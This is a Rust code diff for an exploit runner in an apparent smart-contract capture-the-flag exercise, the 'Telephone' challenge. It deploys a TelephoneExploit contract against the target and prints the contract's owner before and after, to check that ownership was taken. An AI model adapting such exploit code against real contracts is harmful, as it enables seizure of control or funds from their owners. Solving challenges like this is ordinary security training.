@@ -26,8 +26,22 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        let _ = TelephoneExploit::deploy(offender.provider(), target.address)
-            .await?;
+        let contract = Telephone::new(target.address, offender.provider());
+
+        let owner_before = contract.owner().call().await?;
+
+        let result = TelephoneExploit::deploy(
+            offender.provider(),
+            target.address,
+            offender.address(),
+        )
+        .await;
+
+        let owner_after = contract.owner().call().await?;
+
+        println!("owner before: {:?}", owner_before);
+        println!("owner after: {:?}", owner_after);
+        println!("{:?}", result);
 
         Ok(())
     }
